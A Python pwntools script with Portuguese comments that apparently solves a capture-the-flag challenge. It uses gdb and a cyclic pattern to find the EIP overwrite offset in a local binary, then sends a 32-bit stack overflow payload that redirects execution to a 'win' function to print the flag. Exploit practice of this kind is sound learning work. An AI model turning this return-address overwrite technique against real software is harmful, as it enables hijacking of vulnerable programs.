from pwn import *
import subprocess
import re


# Nome do binário gerado pelo desafio (substitua pelo nome real do executável)
binary_path = './40' 

print("[*] 1. Iniciando teste com padrão cíclico para achar o offset...")
p = process(binary_path)



cmd = f"gdb -batch -ex 'print &win' {binary_path}"

output = subprocess.check_output(cmd, shell=True).decode()

match = re.search(r'(0x[0-9a-fA-F]+)', output)

if match:
	win_addr_str = match.group(1)
	win_addr = int(win_addr_str,16)
	print(f"[+] Endereço estraido com sucesso {win_addr_str} , ({win_addr})")
else:
# Fallback caso a regex falhe: usa o ELF do pwntools diretamente
	elf = ELF(binary_path, checksec=False)
	win_addr = elf.symbols['win']
	print(f"[+] Endereço da win via ELF: {hex(win_addr)}")
# Cria um padrão grande o suficiente para estourar qualquer buffer comum (ex: 200 bytes)
pattern = cyclic(200)

cmd_gdb = f"gdb -batch -ex 'run' -ex 'info register eip' {binary_path} "

gdb_output = subprocess.run(
	cmd_gdb,
	input=pattern,
	capture_output=True,
	shell=True
).stdout.decode()

# Manda o pattern para o input do binário (ajuste 'Enter the secret key:' se o prompt for diferente)

match_eip = re.search(r'eip\s+(0x[0-9a-fA-F]+)',gdb_output)
if match_eip:
	crash_value = int(match_eip.group(1),16)
	offset = cyclic_find(crash_value)
	print(f"[[+]] offset calculado")
else:
	print(f"[[-]] Erro!!")
	exit(1)


print(f"[+] Crash detectado no registrador com o valor: {hex(crash_value)}")


# ==========================================
# 2. SEGUNDA ETAPA: Enviar o Payload Definitivo
# ==========================================
print("[*] 2. Enviando o exploit final...")
p2 = process(binary_path)

# Se o desafio tiver uma função win ou se você precisar pular para algo:
# (Substitua win_addr pelo endereço correto da função alvo ou monte o payload necessário)
# Exemplo para 32-bit, ajuste se for 64-bit ou outro endereço
print(f"[+] Endereço da função win encontrada {hex(win_addr)}")



payload = b"A" * offset + p32(win_addr) 

p2.sendlineafter(b': ', payload)

# Interage para ver a flag impressa na tela
p2.interactive()